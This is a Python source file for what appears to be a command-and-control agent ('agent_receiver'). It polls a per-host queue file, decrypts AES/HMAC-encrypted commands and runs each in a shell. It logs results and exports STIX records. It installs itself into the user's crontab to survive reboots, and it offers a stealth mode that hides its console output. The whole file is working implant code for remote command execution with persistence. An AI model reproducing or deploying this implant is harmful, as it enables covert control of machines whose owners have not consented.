#!/usr/bin/env python3
# Ruta: modules/c2/agent_receiver.py

import os
import json
import base64
import hashlib
import socket
import subprocess
import time
import uuid
import shutil
from datetime import datetime
from Crypto.Cipher import AES
from Crypto.Hash import HMAC, SHA256
from Crypto.Util.Padding import unpad

AGENT_ID = socket.gethostname()
QUEUE_FILE = f"c2/queues/{AGENT_ID}.queue"
HMAC_ENV = "C2_HMAC_KEY"
KEY_ENV = "C2_AES_KEY"
RESULTS_DIR = "results"
EXEC_LOG = f"{RESULTS_DIR}/agent_exec_log_{AGENT_ID}.jsonl"
STIX_OUT = f"{RESULTS_DIR}/stix_exec_{AGENT_ID}.json"
STEALTH = os.getenv("AGENT_STEALTH", "0") == "1"
STATUS_FILE = f"results/status_{AGENT_ID}.json"
KILL_FILE = f"c2/queues/{AGENT_ID}.stop"

os.makedirs("c2/queues", exist_ok=True)
os.makedirs(RESULTS_DIR, exist_ok=True)

def decrypt_command(payload, key, hmac_key=None):
    decoded = base64.b64decode(payload)
    iv = decoded[:16]
    ct = decoded[16:-32] if hmac_key else decoded[16:]
    hmac_val = decoded[-32:] if hmac_key else None

    if hmac_key:
        h = HMAC.new(hmac_key.encode(), digestmod=SHA256)
        h.update(iv + ct)
        h.verify(hmac_val)

    cipher = AES.new(hashlib.sha256(key.encode()).digest(), AES.MODE_CBC, iv)
    return unpad(cipher.decrypt(ct), AES.block_size).decode()

def execute_command(cmd):
    try:
        output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, timeout=45)
        return output.decode()
    except subprocess.CalledProcessError as e:
        return e.output.decode()
    except Exception as e:
        return f"[ERROR] {str(e)}"

def log_execution(cmd, result):
    entry = {
        "timestamp": datetime.utcnow().isoformat(),
        "agent_id": AGENT_ID,
        "command": cmd,
        "command_hash": hashlib.sha256(cmd.encode()).hexdigest(),
        "output_hash": hashlib.sha256(result.encode()).hexdigest(),
        "output_snippet": result[:250]
    }
    with open(EXEC_LOG, "a") as f:
        f.write(json.dumps(entry) + "\n")

def export_stix(cmd, result):
    bundle = {
        "type": "bundle",
        "id": f"bundle--{str(uuid.uuid4())}",
        "objects": [
            {
                "type": "observed-data",
                "id": f"observed-data--{str(uuid.uuid4())}",
                "created": datetime.utcnow().isoformat(),
                "modified": datetime.utcnow().isoformat(),
                "number_observed": 1,
                "first_observed": datetime.utcnow().isoformat(),
                "last_observed": datetime.utcnow().isoformat(),
                "x_exec": {
                    "agent": AGENT_ID,
                    "command": cmd,
                    "output": result[:500]
                }
            }
        ]
    }
    with open(STIX_OUT, "w") as f:
        json.dump(bundle, f, indent=2)

def post_status(last_cmd=None):
    status = {
        "agent": AGENT_ID,
        "timestamp": datetime.utcnow().isoformat(),
        "last_cmd": last_cmd,
        "status": "idle"
    }
    with open(STATUS_FILE, "w") as f:
        json.dump(status, f)

def install_persistence():
    script_path = os.path.abspath(__file__)
    crontab_line = f"@reboot python3 {script_path}"
    try:
        existing = subprocess.check_output(["crontab", "-l"], stderr=subprocess.DEVNULL).decode()
    except:
        existing = ""
    if crontab_line not in existing:
        updated = existing + "\n" + crontab_line + "\n"
        p = subprocess.Popen(["crontab", "-"], stdin=subprocess.PIPE)
        p.communicate(input=updated.encode())

def process_queue():
    if not os.path.exists(QUEUE_FILE):
        return

    key = os.environ.get(KEY_ENV)
    hmac_key = os.environ.get(HMAC_ENV)

    with open(QUEUE_FILE, "r") as f:
        lines = f.readlines()

    os.remove(QUEUE_FILE)

    for line in lines:
        cmd = line.strip()
        if key:
            try:
                cmd = decrypt_command(cmd, key, hmac_key)
            except Exception:
                continue

        result = execute_command(cmd)
        log_execution(cmd, result)
        export_stix(cmd, result)
        post_status(cmd)

def main_loop():
    if not STEALTH:
        print(f"[+] Agent receiver active: {AGENT_ID}")
    install_persistence()
    while True:
        if os.path.exists(KILL_FILE):
            os.remove(KILL_FILE)
            if not STEALTH:
                print(f"[!] Kill switch triggered for agent {AGENT_ID}")
            break
        process_queue()
        time.sleep(5)

main_loop()
